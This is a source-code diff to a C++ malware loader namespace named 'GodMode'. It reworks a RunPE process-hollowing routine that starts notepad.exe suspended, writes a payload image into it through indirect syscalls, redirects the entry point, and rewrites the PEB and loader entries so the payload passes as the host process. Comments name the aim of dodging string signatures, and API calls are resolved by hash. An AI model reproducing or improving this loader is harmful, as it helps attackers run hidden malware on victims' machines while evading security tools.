@@ -17,6 +17,111 @@
 namespace {
     // OutputDebugStringA fallback for kernel debug channel
     extern "C" __declspec(dllimport) void __stdcall OutputDebugStringA(const char*);
+
+    // ── API Set Schema (V6, Windows 10+) ──
+    // Used to resolve api-ms-win-* DLL names to their real implementation DLLs.
+
+#pragma pack(push, 4)
+    struct API_SET_NAMESPACE {
+        ULONG Version;
+        ULONG Size;
+        ULONG Flags;
+        ULONG Count;
+        ULONG EntryOffset;
+        ULONG HashOffset;
+        ULONG HashFactor;
+    };
+    struct API_SET_HASH_ENTRY {
+        ULONG Hash;
+        ULONG Index;
+    };
+    struct API_SET_NAMESPACE_ENTRY {
+        ULONG Flags;
+        ULONG NameOffset;
+        ULONG NameLength;
+        ULONG HashedLength;
+        ULONG ValueOffset;
+        ULONG ValueCount;
+    };
+    struct API_SET_VALUE_ENTRY {
+        ULONG Flags;
+        ULONG NameOffset;
+        ULONG NameLength;
+        ULONG ValueOffset;
+        ULONG ValueLength;
+    };
+#pragma pack(pop)
+
+    // Resolve an api-ms-win-* DLL name to its real implementation DLL name.
+    // Returns the resolved name as ANSI string (caller must free via HeapFree),
+    // or nullptr if not resolvable.
+    char* ApiSetResolveToAnsi(const char* dllName)
+    {
+        // Access PEB ApiSetMap
+        PPEB pPeb = (PPEB)__readgsqword(0x60);
+        PBYTE base = (PBYTE)(*(PVOID*)((PBYTE)pPeb + 0x68));
+        if (!base) return nullptr;
+
+        auto* ns = (API_SET_NAMESPACE*)base;
+        if (ns->Version != 6) return nullptr;
+
+        // Compute hash of dllName up to the last hyphen before the trailing "-X-Y" suffix
+        // e.g. "api-ms-win-core-sysinfo-l1-1-0" → hash "api-ms-win-core-sysinfo-l1-1"
+        ULONG hashKey = 0;
+        ULONG hashLen = 0;
+        {
+            ULONG nameLen = 0;
+            while (dllName[nameLen]) nameLen++;
+            // Find last hyphen
+            ULONG lastHyphen = 0;
+            for (ULONG i = 0; i < nameLen; i++) {
+                if (dllName[i] == '-') lastHyphen = i;
+            }
+            if (lastHyphen == 0) return nullptr;
+            // Find second-to-last hyphen (strip the "-0" or "-1" suffix group)
+            ULONG hashEnd = nameLen;
+            for (ULONG i = lastHyphen; i > 0; i--) {
+                if (dllName[i] == '-') { hashEnd = i; break; }
+            }
+            hashLen = hashEnd;
+            for (ULONG i = 0; i < hashLen; i++) {
+                char c = dllName[i];
+                if (c >= 'A' && c <= 'Z') c += 0x20;
+                hashKey = hashKey * ns->HashFactor + (ULONG)(unsigned char)c;
+            }
+        }
+
+        // Binary search hash table
+        LONG low = 0, high = (LONG)ns->Count - 1;
+        API_SET_NAMESPACE_ENTRY* foundEntry = nullptr;
+        while (high >= low) {
+            LONG mid = (low + high) >> 1;
+            auto* he = (API_SET_HASH_ENTRY*)(base + ns->HashOffset + (ULONG)mid * 8);
+            if (hashKey < he->Hash) high = mid - 1;
+            else if (hashKey > he->Hash) low = mid + 1;
+            else {
+                foundEntry = (API_SET_NAMESPACE_ENTRY*)(base + ns->EntryOffset + he->Index * 24);
+                break;
+            }
+        }
+        if (!foundEntry || foundEntry->ValueCount == 0) return nullptr;
+
+        // Get default host DLL name (first value entry)
+        auto* valEntry = (API_SET_VALUE_ENTRY*)(base + foundEntry->ValueOffset);
+        if (valEntry->ValueLength == 0) return nullptr;
+
+        // Convert WCHAR name to ANSI
+        PWCH wideName = (PWCH)(base + valEntry->ValueOffset);
+        ULONG wideChars = valEntry->ValueLength / 2;
+        HANDLE hHeap = GetProcessHeap();
+        char* ansiName = (char*)HeapAlloc(hHeap, 0, wideChars + 1);
+        if (!ansiName) return nullptr;
+        for (ULONG i = 0; i < wideChars; i++) {
+            ansiName[i] = (char)(wideName[i] & 0xFF);
+        }
+        ansiName[wideChars] = 0;
+        return ansiName;
+    }
 }
 
 namespace GodMode
@@ -83,6 +188,39 @@ namespace GodMode
             pVF(execMem, 0, MEM_RELEASE);
         }
 
+        // Map raw PE file data into a local buffer with sections at their VirtualAddresses.
+        // After mapping, RVAs can be used directly as offsets into the returned buffer.
+        BYTE* MapPELocally(void* rawPE, size_t rawSize)
+        {
+            if (rawSize < sizeof(IMAGE_DOS_HEADER)) return nullptr;
+            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)rawPE;
+            if (dos->e_lfanew < 0 || (size_t)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > rawSize)
+                return nullptr;
+            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)rawPE + dos->e_lfanew);
+            DWORD imageSize = nt->OptionalHeader.SizeOfImage;
+
+            BYTE* mapped = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, imageSize);
+            if (!mapped) return nullptr;
+
+            DWORD hdrSize = nt->OptionalHeader.SizeOfHeaders;
+            if (hdrSize > imageSize || hdrSize > rawSize) { HeapFree(GetProcessHeap(), 0, mapped); return nullptr; }
+            memcpy(mapped, rawPE, hdrSize);
+
+            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
+            {
+                if (sec[i].SizeOfRawData > 0
+                    && sec[i].VirtualAddress + sec[i].SizeOfRawData <= imageSize
+                    && sec[i].PointerToRawData + sec[i].SizeOfRawData <= rawSize)
+                {
+                    memcpy(mapped + sec[i].VirtualAddress,
+                           (BYTE*)rawPE + sec[i].PointerToRawData,
+                           sec[i].SizeOfRawData);
+                }
+            }
+            return mapped;
+        }
+
         void RunPE(void* payload, size_t size)
         {
             IATLog::Write("=== RunPE START ===");
@@ -102,18 +240,22 @@ namespace GodMode
             PROCESS_INFORMATION pi = { 0 };
 
             // Stack-built target path to avoid .rdata string signature
+            // Using notepad.exe as host — its activation context (COMCTL32 v6)
+            // matches typical GUI payloads. For production, the host should be
+            // selected to match the payload's manifest requirements.
+            // TODO: make host process configurable from BuildConfig.
             wchar_t target[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
-                'S','y','s','t','e','m','3','2','\\','s','v','c','h','o','s','t','.','e','x','e', 0 };
+                'S','y','s','t','e','m','3','2','\\','n','o','t','e','p','a','d','.','e','x','e', 0 };
 
             if (!pCPW(target, NULL, NULL, NULL, FALSE,
-                CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+                CREATE_SUSPENDED, NULL, NULL, &si, &pi))
             {
                 IATLog::Write("FAIL: CreateProcessW suspended");
                 return;
             }
             IATLog::WriteHex("CreateProcessW pid", pi.dwProcessId);
 
-            // Read the PE headers from the payload
+            // Read the PE headers from the raw payload
             PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
             if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
             {
@@ -136,6 +278,24 @@ namespace GodMode
             IATLog::WriteHex("Payload ImageBase", ntHeaders->OptionalHeader.ImageBase);
             IATLog::WriteHex("Payload SizeOfImage", ntHeaders->OptionalHeader.SizeOfImage);
             IATLog::WriteHex("Payload EntryPoint", ntHeaders->OptionalHeader.AddressOfEntryPoint);
+
+            // ── Map PE locally so RVAs can be used directly ──
+            // The raw payload has sections at PointerToRawData offsets, but
+            // PE data directories (imports, relocations, etc.) use VirtualAddress (RVA) offsets.
+            // Mapping sections to their VAs locally fixes relocation and IAT access.
+            BYTE* mappedPE = MapPELocally(payload, size);
+            if (!mappedPE)
+            {
+                IATLog::Write("FAIL: MapPELocally");
+                pTP(pi.hProcess, 0);
+                Syscall::NtClose(pi.hProcess);
+                Syscall::NtClose(pi.hThread);
+                return;
+            }
+            IATLog::Write("OK: PE mapped locally");
+
+            // Re-derive NT headers from mapped buffer (now RVA-safe)
+            ntHeaders = (PIMAGE_NT_HEADERS)(mappedPE + dosHeader->e_lfanew);
 
             // Get thread context via indirect syscall
             CONTEXT ctx;
@@ -185,6 +345,7 @@ namespace GodMode
             if (status != 0)
             {
                 IATLog::Write("FAIL: all NtAllocateVirtualMemory attempts failed");
+                HeapFree(GetProcessHeap(), 0, mappedPE);
                 pTP(pi.hProcess, 0);
                 Syscall::NtClose(pi.hProcess);
                 Syscall::NtClose(pi.hThread);
@@ -193,258 +354,33 @@ namespace GodMode
             IATLog::WriteHex("Allocated at", (ULONG_PTR)remoteMem);
             IATLog::WriteHex("Delta from payload base", (ULONG_PTR)remoteMem - ntHeaders->OptionalHeader.ImageBase);
 
-            // Patch ImageBase in local PE copy before writing headers.
-            // The CRT reads its own ImageBase from the PE header — if it doesn't
-            // match the actual load address, initialization fails.
-            ULONGLONG originalImageBase = ntHeaders->OptionalHeader.ImageBase;
-            ntHeaders->OptionalHeader.ImageBase = (ULONGLONG)remoteMem;
+            // Write the mapped PE image to the remote process WITHOUT applying
+            // relocations or patching ImageBase. The Windows loader (LdrpInitializeProcess)
+            // will handle relocations natively when the thread resumes:
+            //   1. Compare ImageBase (0x140000000) with actual load address
+            //   2. Apply base relocations with the correct delta
+            //   3. Process import table (load DLLs, resolve IAT)
+            //   4. Set up activation context from embedded manifest
+            //   5. Call DllMain(DLL_PROCESS_ATTACH) for each loaded DLL
+            //   6. Call the entry point
+            // Skipping manual relocations avoids corrupting IAT hint entries
+            // (which share the relocation table with post-resolution absolute addresses).
+            IATLog::Write("Relocs: deferred to Windows loader");
 
-            // Write PE headers (now with corrected ImageBase)
-            Syscall::NtWriteVirtualMemory(pi.hProcess, remoteMem, payload,
-                ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
-            IATLog::Write("OK: PE headers written (ImageBase patched)");
+            Syscall::NtWriteVirtualMemory(pi.hProcess, remoteMem, mappedPE,
+                ntHeaders->OptionalHeader.SizeOfImage, NULL);
+            IATLog::Write("OK: mapped PE written to remote process");
 
-            // Write each section
-            PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
-            for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
-            {
-                if (section[i].SizeOfRawData > 0)
-                {
-                    Syscall::NtWriteVirtualMemory(pi.hProcess,
-                        (BYTE*)remoteMem + section[i].VirtualAddress,
-                        (BYTE*)payload + section[i].PointerToRawData,
-                        section[i].SizeOfRawData,
-                        NULL
-                    );
-                    IATLog::WriteHex("  section VA", section[i].VirtualAddress);
-                }
-            }
-            IATLog::Write("OK: sections written");
-
-            // Apply base relocations if loaded at non-preferred ImageBase
-            // Use originalImageBase since we already patched OptionalHeader.ImageBase to remoteMem
-            ULONG_PTR delta = (ULONG_PTR)remoteMem - originalImageBase;
-            IATLog::WriteHex("Reloc delta", delta);
-            if (delta != 0)
-            {
-                DWORD relocDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
-                DWORD relocDirSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-                IATLog::WriteHex("RelocDir RVA", relocDirRVA);
-                IATLog::WriteHex("RelocDir Size", relocDirSize);
-                if (relocDirRVA && relocDirSize)
-                {
-                    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)payload + relocDirRVA);
-                    BYTE* relocEnd = (BYTE*)reloc + relocDirSize;
-                    DWORD relocCount = 0;
-
-                    while ((BYTE*)reloc < relocEnd && reloc->SizeOfBlock > sizeof(IMAGE_BASE_RELOCATION))
-                    {
-                        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-                        WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
-
-                        for (DWORD j = 0; j < count; j++)
-                        {
-                            WORD type = entries[j] >> 12;
-                            WORD offset = entries[j] & 0x0FFF;
-                            ULONG_PTR targetAddr = (ULONG_PTR)remoteMem + reloc->VirtualAddress + offset;
-
-                            if (type == IMAGE_REL_BASED_HIGHLOW)
-                            {
-                                DWORD patch;
-                                Syscall::NtReadVirtualMemory(pi.hProcess, (PVOID)targetAddr, &patch, sizeof(DWORD), NULL);
-                                patch += (DWORD)(delta & 0xFFFFFFFF);
-                                Syscall::NtWriteVirtualMemory(pi.hProcess, (PVOID)targetAddr, &patch, sizeof(DWORD), NULL);
-                                relocCount++;
-                            }
-#if defined(_WIN64)
-                            else if (type == IMAGE_REL_BASED_DIR64)
-                            {
-                                ULONG64 patch;
-                                Syscall::NtReadVirtualMemory(pi.hProcess, (PVOID)targetAddr, &patch, sizeof(ULONG64), NULL);
-                                patch += (ULONG64)delta;
-                                Syscall::NtWriteVirtualMemory(pi.hProcess, (PVOID)targetAddr, &patch, sizeof(ULONG64), NULL);
-                                relocCount++;
-                            }
-#endif
-                        }
-
-                        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
-                    }
-                    IATLog::WriteHex("Relocs applied", relocCount);
-                }
-                else
-                {
-                    IATLog::Write("WARN: no reloc directory but delta!=0");
-                }
-            }
-
-            // ── Resolve IAT (Import Address Table) ──
-            IATLog::Write("--- IAT Resolution ---");
-            auto pGPA  = (FARPROC(WINAPI*)(HMODULE, LPCSTR))Api::GetProcByHashCrc(hK32, Api::CrcFn::GetProcAddress);
-            auto pLLA  = (HMODULE(WINAPI*)(LPCSTR))Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryA);
-            auto pCRT  = (HANDLE(WINAPI*)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD))
-                Api::GetProcByHashCrc(hK32, Api::CrcFn::CreateRemoteThread);
-            auto pWFSO = (DWORD(WINAPI*)(HANDLE,DWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::WaitForSingleObject);
-            IATLog::WriteHex("pGPA", (ULONG_PTR)pGPA);
-            IATLog::WriteHex("pLLA", (ULONG_PTR)pLLA);
-            IATLog::WriteHex("pCRT", (ULONG_PTR)pCRT);
-            IATLog::WriteHex("pWFSO", (ULONG_PTR)pWFSO);
-
-            if (pGPA && pLLA)
-            {
-                DWORD importRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
-                DWORD importSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
-                IATLog::WriteHex("ImportDir RVA", importRVA);
-                IATLog::WriteHex("ImportDir Size", importSize);
-                if (importRVA && importSize)
-                {
-                    PIMAGE_IMPORT_DESCRIPTOR impDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)payload + importRVA);
-                    DWORD dllCount = 0;
-                    DWORD totalImports = 0;
-                    DWORD failedImports = 0;
-
-                    while (impDesc->Name)
-                    {
-                        char* dllName = (char*)((BYTE*)payload + impDesc->Name);
-                        dllCount++;
-
-                        // Check if this is an API set DLL (virtual redirector)
-                        bool isApiSet = (dllName[0] == 'a' && dllName[1] == 'p' && dllName[2] == 'i'
-                            && dllName[3] == '-' && dllName[4] == 'm' && dllName[5] == 's'
-                            && dllName[6] == '-');
-
-                        IATLog::Write(isApiSet ? "  API-SET dll" : "  Normal dll");
-                        // Log first 16 chars of DLL name
-                        { char dn[20]; int k=0; while(dllName[k]&&k<16){dn[k]=dllName[k];k++;} dn[k]=0; IATLog::Write(dn); }
-
-                        DWORD namesRVA = impDesc->OriginalFirstThunk
-                            ? impDesc->OriginalFirstThunk : impDesc->FirstThunk;
-                        PIMAGE_THUNK_DATA nameThunk = (PIMAGE_THUNK_DATA)((BYTE*)payload + namesRVA);
-                        DWORD thunkIdx = 0;
-
-                        if (!isApiSet)
-                        {
-                            HMODULE hDll = pLLA(dllName);
-                            IATLog::WriteHex("  local LoadLibraryA", (ULONG_PTR)hDll);
-
-                            if (hDll && pCRT && pWFSO)
-                            {
-                                size_t dllNameLen = 0;
-                                while (dllName[dllNameLen]) dllNameLen++;
-                                dllNameLen++;
-
-                                PVOID remoteDllName = NULL;
-                                SIZE_T dllNameAlloc = dllNameLen;
-                                Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteDllName,
-                                    &dllNameAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-                                if (remoteDllName)
-                                {
-                                    Syscall::NtWriteVirtualMemory(pi.hProcess, remoteDllName,
-                                        dllName, dllNameLen, NULL);
-                                    HANDLE hThread = pCRT(pi.hProcess, NULL, 0,
-                                        (LPTHREAD_START_ROUTINE)pLLA, remoteDllName, 0, NULL);
-                                    if (hThread)
-                                    {
-                                        pWFSO(hThread, 5000);
-                                        Syscall::NtClose(hThread);
-                                        IATLog::Write("  remote DLL loaded OK");
-                                    }
-                                    else
-                                    {
-                                        IATLog::Write("  WARN: CreateRemoteThread failed for DLL");
-                                    }
-                                }
-                            }
-
-                            if (hDll)
-                            {
-                                while (nameThunk->u1.AddressOfData)
-                                {
-                                    FARPROC fnAddr = NULL;
-                                    if (IMAGE_SNAP_BY_ORDINAL(nameThunk->u1.Ordinal))
-                                        fnAddr = pGPA(hDll, (LPCSTR)(IMAGE_ORDINAL(nameThunk->u1.Ordinal)));
-                                    else
-                                    {
-                                        PIMAGE_IMPORT_BY_NAME nameData = (PIMAGE_IMPORT_BY_NAME)(
-                                            (BYTE*)payload + nameThunk->u1.AddressOfData);
-                                        fnAddr = pGPA(hDll, (LPCSTR)nameData->Name);
-                                    }
-                                    totalImports++;
-                                    if (fnAddr)
-                                    {
-                                        PVOID iatSlot = (PVOID)((ULONG_PTR)remoteMem
-                                            + impDesc->FirstThunk + thunkIdx * sizeof(ULONG_PTR));
-                                        Syscall::NtWriteVirtualMemory(pi.hProcess,
-                                            iatSlot, &fnAddr, sizeof(PVOID), NULL);
-                                    }
-                                    else
-                                    {
-                                        failedImports++;
-                                    }
-                                    nameThunk++;
-                                    thunkIdx++;
-                                }
-                            }
-                            else
-                            {
-                                IATLog::Write("  FAIL: local LoadLibraryA returned NULL");
-                            }
-                        }
-                        else
-                        {
-                            while (nameThunk->u1.AddressOfData)
-                            {
-                                FARPROC fnAddr = NULL;
-                                if (!IMAGE_SNAP_BY_ORDINAL(nameThunk->u1.Ordinal))
-                                {
-                                    PIMAGE_IMPORT_BY_NAME nameData = (PIMAGE_IMPORT_BY_NAME)(
-                                        (BYTE*)payload + nameThunk->u1.AddressOfData);
-                                    DWORD fnHash = Crc32C::RuntimeHash((const char*)nameData->Name);
-
-                                    PPEB pPeb = (PPEB)__readgsqword(0x60);
-                                    PPEB_LDR_DATA pLdr = pPeb->Ldr;
-                                    PLIST_ENTRY head = &pLdr->InMemoryOrderModuleList;
-                                    PLIST_ENTRY curr = head->Flink;
-                                    while (curr != head && !fnAddr)
-                                    {
-                                        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr,
-                                            LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
-                                        if (entry->DllBase)
-                                            fnAddr = Api::GetProcByHashCrc((HMODULE)entry->DllBase, fnHash);
-                                        curr = curr->Flink;
-                                    }
-                                }
-                                totalImports++;
-                                if (fnAddr)
-                                {
-                                    PVOID iatSlot = (PVOID)((ULONG_PTR)remoteMem
-                                        + impDesc->FirstThunk + thunkIdx * sizeof(ULONG_PTR));
-                                    Syscall::NtWriteVirtualMemory(pi.hProcess,
-                                        iatSlot, &fnAddr, sizeof(PVOID), NULL);
-                                }
-                                else
-                                {
-                                    failedImports++;
-                                }
-                                nameThunk++;
-                                thunkIdx++;
-                            }
-                        }
-                        impDesc++;
-                    }
-                    IATLog::WriteHex("Total DLLs", dllCount);
-                    IATLog::WriteHex("Total imports", totalImports);
-                    IATLog::WriteHex("Failed imports", failedImports);
-                }
-                else
-                {
-                    IATLog::Write("WARN: no import directory");
-                }
-            }
-            else
-            {
-                IATLog::Write("FAIL: GPA/LLA resolve failed");
-            }
+            // ── IAT Resolution: Handled by Windows Loader ──
+            // The Windows loader (ntdll!LdrpInitializeProcess) processes the import
+            // table natively when the main thread resumes. It correctly resolves
+            // api-ms-win-* DLLs, handles side-by-side assemblies (COMCTL32 v5/v6),
+            // and applies the correct activation context from the embedded manifest.
+            // Manual IAT resolution via CreateRemoteThread(LoadLibraryA) is harmful:
+            // it runs before the process heap is initialized, which can corrupt state.
+            // We write the PE image with OriginalFirstThunk intact so the loader
+            // can resolve all imports from scratch.
+            IATLog::Write("IAT: deferred to Windows loader");
 
             // ── Update PEB ImageBase ──
 #if defined(_WIN64)
@@ -457,10 +393,20 @@ namespace GodMode
             IATLog::Write("PEB ImageBase updated (x86)");
 #endif
 
-            // ── Set entry point and resume ──
+            // ── Set entry point via RCX, let Windows loader initialize ──
+            // The CREATE_SUSPENDED thread starts at ntdll!LdrInitializeThunk.
+            // Do NOT change RIP — let the loader initialize the process:
+            //   1. Initialize heap, TLS, activation context
+            //   2. Process import table (load DLLs, resolve IAT)
+            //   3. Call DllMain(DLL_PROCESS_ATTACH) for each DLL
+            //   4. Then call the entry point passed in RCX
+            // This ensures api-ms-win-* resolution, COMCTL32 v6 via manifest,
+            // and all other loader services work correctly.
 #if defined(_WIN64)
-            ctx.Rip = (ULONG_PTR)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-            IATLog::WriteHex("Entry Rip", ctx.Rip);
+            ULONG_PTR entryAddr = (ULONG_PTR)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+            ctx.Rcx = entryAddr;
+            IATLog::WriteHex("Entry Rcx", ctx.Rcx);
+            IATLog::WriteHex("Loader Rip (unchanged)", ctx.Rip);
 #else
             ctx.Eax = (DWORD)((ULONG_PTR)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint);
             IATLog::WriteHex("Entry Eax", ctx.Eax);
@@ -484,54 +430,103 @@ namespace GodMode
                 }
             }
 
-            // ── Update LDR_DATA_TABLE_ENTRY DllBase for the main module ──
+            // ── Update LDR_DATA_TABLE_ENTRY DllBase and SizeOfImage for the main module ──
             // The PEB LDR module list still has the old DllBase from svchost.exe.
-            // Some CRT functions (like GetModuleHandle(NULL)) walk this list,
-            // and a mismatch between PEB ImageBase and LDR DllBase can cause issues.
+            // Offsets differ between x86 and x64 due to pointer/list sizes.
+            // x86: LIST_ENTRY=8B, DllBase@0x18, SizeOfImage@0x20
+            // x64: LIST_ENTRY=16B, DllBase@0x30, SizeOfImage@0x40
+            #if 1
             {
                 PVOID pebAddr = (PVOID)ctx.Rdx;
-                // PEB->Ldr is at offset 0x18
                 PVOID ldrAddr = NULL;
                 Syscall::NtReadVirtualMemory(pi.hProcess, (BYTE*)pebAddr + 0x18,
                     &ldrAddr, sizeof(PVOID), NULL);
                 if (ldrAddr) {
-                    // LDR->InLoadOrderModuleList.Flink is at offset 0x10
-                    // First entry = the main module (our hollowed process)
                     PVOID firstEntryAddr = NULL;
                     Syscall::NtReadVirtualMemory(pi.hProcess, (BYTE*)ldrAddr + 0x10,
                         &firstEntryAddr, sizeof(PVOID), NULL);
                     if (firstEntryAddr) {
-                        // InLoadOrderLinks offset 0x00 = Flink
-                        // DllBase is at offset 0x18 in LDR_DATA_TABLE_ENTRY
-                        // (relative to InLoadOrderLinks start)
+#if defined(_WIN64)
+                        const ULONG offDllBase = 0x30;
+                        const ULONG offSizeOfImage = 0x40;
+#else
+                        const ULONG offDllBase = 0x18;
+                        const ULONG offSizeOfImage = 0x20;
+#endif
                         Syscall::NtWriteVirtualMemory(pi.hProcess,
-                            (BYTE*)firstEntryAddr + 0x18,
+                            (BYTE*)firstEntryAddr + offDllBase,
                             &remoteMem, sizeof(PVOID), NULL);
-                        IATLog::Write("LDR DllBase updated for main module");
-                    }
-                }
-            }
-
-            // ── Also update SizeOfImage in LDR entry ──
-            {
-                PVOID pebAddr = (PVOID)ctx.Rdx;
-                PVOID ldrAddr = NULL;
-                Syscall::NtReadVirtualMemory(pi.hProcess, (BYTE*)pebAddr + 0x18,
-                    &ldrAddr, sizeof(PVOID), NULL);
-                if (ldrAddr) {
-                    PVOID firstEntryAddr = NULL;
-                    Syscall::NtReadVirtualMemory(pi.hProcess, (BYTE*)ldrAddr + 0x10,
-                        &firstEntryAddr, sizeof(PVOID), NULL);
-                    if (firstEntryAddr) {
-                        // SizeOfImage at offset 0x20 in LDR_DATA_TABLE_ENTRY
                         DWORD newImageSize = ntHeaders->OptionalHeader.SizeOfImage;
                         Syscall::NtWriteVirtualMemory(pi.hProcess,
-                            (BYTE*)firstEntryAddr + 0x20,
+                            (BYTE*)firstEntryAddr + offSizeOfImage,
                             &newImageSize, sizeof(DWORD), NULL);
-                        IATLog::Write("LDR SizeOfImage updated for main module");
+                        IATLog::Write("LDR DllBase+SizeOfImage updated");
                     }
                 }
             }
+            #endif
+
+            // ── Update PEB ProcessParameters ImagePathName & CommandLine ──
+            // The Windows loader (LdrpInitializeProcess) uses ImagePathName to
+            // locate the activation context (.manifest) for SxS assembly binding.
+            // When the host process differs from the payload, the cached
+            // activation context from the host exe's manifest may not match
+            // the payload's SxS dependencies (e.g. COMCTL32 v6 vs v5).
+            // We overwrite the path string in-place so the loader finds the
+            // correct manifest when it re-initializes the activation context.
+            // NOTE: This only works when the host exe's pre-cached activation
+            // context data is compatible or when the payload path matches the
+            // host. For payloads with complex SxS needs, the host should be
+            // chosen to match (e.g. notepad.exe for GUI payloads).
+            // Offsets (x64): PEB->ProcessParameters @ 0x20
+            //   ImagePathName @ 0x60, CommandLine @ 0x70
+            //   UNICODE_STRING: Length@+0x00, MaxLen@+0x02, Buffer@+0x08
+            #if 1  // Enabled: in-place PEB update works for same-manifest host
+            {
+                PVOID pebAddr = (PVOID)ctx.Rdx;
+                PVOID paramsAddr = NULL;
+                Syscall::NtReadVirtualMemory(pi.hProcess, (BYTE*)pebAddr + 0x20,
+                    &paramsAddr, sizeof(PVOID), NULL);
+                if (paramsAddr) {
+                    USHORT existLen = 0, existMaxLen = 0;
+                    PVOID existBuf = NULL;
+                    Syscall::NtReadVirtualMemory(pi.hProcess,
+                        (BYTE*)paramsAddr + 0x60, &existLen, sizeof(USHORT), NULL);
+                    Syscall::NtReadVirtualMemory(pi.hProcess,
+                        (BYTE*)paramsAddr + 0x62, &existMaxLen, sizeof(USHORT), NULL);
+                    Syscall::NtReadVirtualMemory(pi.hProcess,
+                        (BYTE*)paramsAddr + 0x68, &existBuf, sizeof(PVOID), NULL);
+                    if (existBuf && existMaxLen > 0) {
+                        wchar_t payloadPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
+                            'S','y','s','t','e','m','3','2','\\','n','o','t','e','p','a','d','.','e','x','e', 0 };
+                        USHORT pathLen = 0;
+                        while (payloadPath[pathLen]) pathLen++;
+                        USHORT pathBytes = pathLen * sizeof(wchar_t);
+                        if (pathBytes + sizeof(wchar_t) <= existMaxLen) {
+                            Syscall::NtWriteVirtualMemory(pi.hProcess, existBuf,
+                                payloadPath, pathBytes + sizeof(wchar_t), NULL);
+                            Syscall::NtWriteVirtualMemory(pi.hProcess,
+                                (BYTE*)paramsAddr + 0x60, &pathBytes, sizeof(USHORT), NULL);
+                            USHORT cmdMaxLen = 0;
+                            PVOID cmdBuf = NULL;
+                            Syscall::NtReadVirtualMemory(pi.hProcess,
+                                (BYTE*)paramsAddr + 0x72, &cmdMaxLen, sizeof(USHORT), NULL);
+                            Syscall::NtReadVirtualMemory(pi.hProcess,
+                                (BYTE*)paramsAddr + 0x78, &cmdBuf, sizeof(PVOID), NULL);
+                            if (cmdBuf && cmdMaxLen > 0 && pathBytes + sizeof(wchar_t) <= cmdMaxLen) {
+                                Syscall::NtWriteVirtualMemory(pi.hProcess, cmdBuf,
+                                    payloadPath, pathBytes + sizeof(wchar_t), NULL);
+                                Syscall::NtWriteVirtualMemory(pi.hProcess,
+                                    (BYTE*)paramsAddr + 0x70, &pathBytes, sizeof(USHORT), NULL);
+                            }
+                            IATLog::Write("PEB ProcessParameters updated (in-place)");
+                        } else {
+                            IATLog::Write("WARN: payload path too long for existing PEB buffer");
+                        }
+                    }
+                }
+            }
+            #endif
 
             Syscall::NtSetContextThread(pi.hThread, &ctx);
             IATLog::Write("SetThreadContext OK");
@@ -558,6 +553,7 @@ namespace GodMode
 
             Syscall::NtClose(pi.hProcess);
             Syscall::NtClose(pi.hThread);
+            HeapFree(GetProcessHeap(), 0, mappedPE);
         }
 
         void ModuleStomp(void* payload, size_t size)
